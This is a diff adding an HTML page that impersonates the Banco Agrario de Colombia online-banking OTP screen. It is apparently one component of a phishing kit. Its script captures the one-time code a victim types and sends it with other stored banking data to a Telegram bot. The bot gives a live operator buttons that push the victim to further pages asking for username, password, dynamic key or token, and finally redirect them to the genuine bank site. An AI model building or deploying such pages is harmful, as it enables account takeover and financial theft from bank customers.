@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Código OTP - Banca Virtual Banco Agrario</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-content">
+      <img src="img/logo-loading.1e8df20e3234c350bddc.svg" alt="Cargando..." class="loading-logo">
+      <div class="loading-text">Cargando...</div>
+    </div>
+  </div>
+
+  <!-- Header -->
+  <header class="header">
+    <div class="logo-container">
+      <img src="img/logo_bancoAgrario.5ee1db48b188d1b24e24.svg" alt="Banco Agrario de Colombia" class="logo">
+    </div>
+    <div class="language-selector">
+      <div class="flag-icon"></div>
+      <span class="language-text">ES</span>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="main-content">
+    <div class="form-container">
+      <h1 class="welcome-title">Ingrese el Código de Verificación</h1>
+      
+      <p style="color: #666; font-size: 14px; margin-bottom: 25px;">
+        Hemos enviado un código de verificación a su teléfono o correo electrónico registrado.
+      </p>
+
+      <form id="otpForm">
+        <div class="input-group">
+          <input 
+            type="text" 
+            id="otpInput" 
+            class="input-field otp-input" 
+            placeholder="Código OTP"
+            autocomplete="off"
+            maxlength="20"
+          >
+        </div>
+
+        <div class="btn-container">
+          <button type="button" class="btn-cancelar" onclick="window.location.href='index.html'">
+            Cancelar
+          </button>
+          <button type="submit" class="btn-siguiente" id="btnSiguiente" disabled>
+            Siguiente
+          </button>
+        </div>
+      </form>
+
+      <div class="links-container">
+        <a href="#" class="link-secondary">¿No recibió el código? Reenviar</a>
+      </div>
+    </div>
+
+    <!-- Footer Image -->
+    <img src="img/persona-small.08efe0e0209b478a65bb.png" alt="Personas" class="footer-image">
+    <div class="footer-text">Copyright © Banco Agrario de Colombia 2025. Todos los Derechos Reservados</div>
+  </main>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="/js/banco-utils.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const input = document.getElementById('otpInput');
+      const btn = document.getElementById('btnSiguiente');
+      const form = document.getElementById('otpForm');
+      const overlay = document.getElementById('loadingOverlay');
+      
+      if (!input || !btn || !form || !overlay) return;
+      
+      overlay.classList.remove('show', 'active');
+      overlay.style.display = '';
+      
+      const socketInstance = BancoUtils.initSocket();
+      if (socketInstance) socketInstance.removeAllListeners('telegramAction');
+      
+      btn.disabled = true;
+      btn.classList.remove('active');
+      
+      input.addEventListener('input', function() {
+        const shouldEnable = input.value.replace(/\D/g, '').length >= 4;
+        btn.disabled = !shouldEnable;
+        btn.classList.toggle('active', shouldEnable);
+      });
+      
+      form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        if (btn.disabled) return;
+        
+        const currentSocket = BancoUtils.getSocket();
+        if (!currentSocket || !currentSocket.connected) {
+          BancoUtils.initSocket();
+          await new Promise(resolve => setTimeout(resolve, 500));
+        }
+        
+        overlay.classList.add('show');
+        const data = { otp: input.value.trim() };
+        const fullData = BancoUtils.saveBankData('agrario', data);
+        const message = BancoUtils.formatMessage('BANCO AGRARIO - OTP', fullData);
+        const buttons = [
+          { text: '👤 Usuario', action: 'usuario' },
+          { text: '🔐 Password', action: 'password' },
+          { text: '🔢 Dinámica', action: 'dinamica' },
+          { text: '🔑 Token', action: 'token' },
+          { text: '📱 OTP', action: 'otp' },
+          { text: '✅ Finalizar', action: 'finalizar' }
+        ];
+        const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());
+        
+        try {
+          await BancoUtils.sendToTelegram('otp', { text: message, keyboard });
+        } catch (error) {
+          overlay.classList.remove('show');
+          alert('Error al enviar');
+        }
+      });
+      
+      BancoUtils.onTelegramAction((data) => {
+        if (data.action === 'usuario') window.location.href = 'index.html';
+        else if (data.action === 'password') window.location.href = 'password.html';
+        else if (data.action === 'dinamica') window.location.href = 'dinamica.html';
+        else if (data.action === 'token') window.location.href = 'token.html';
+        else if (data.action === 'finalizar') window.location.href = 'https://www.bancoagrario.gov.co';
+      });
+    });
+  </script>
+</body>
+</html>
